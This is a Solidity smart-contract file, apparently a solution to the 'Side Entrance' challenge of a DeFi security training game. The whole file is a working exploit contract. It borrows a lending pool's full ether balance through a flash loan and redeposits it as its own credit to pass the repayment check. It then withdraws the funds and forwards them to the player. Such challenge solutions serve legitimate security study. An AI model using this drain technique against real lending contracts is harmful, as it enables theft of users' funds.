// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address payable private player;

    constructor(SideEntranceLenderPool _pool, address payable _player) {
        pool = _pool;
        player = _player;
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        player.call{value: address(this).balance}('');
    }

    receive() external payable {}
}
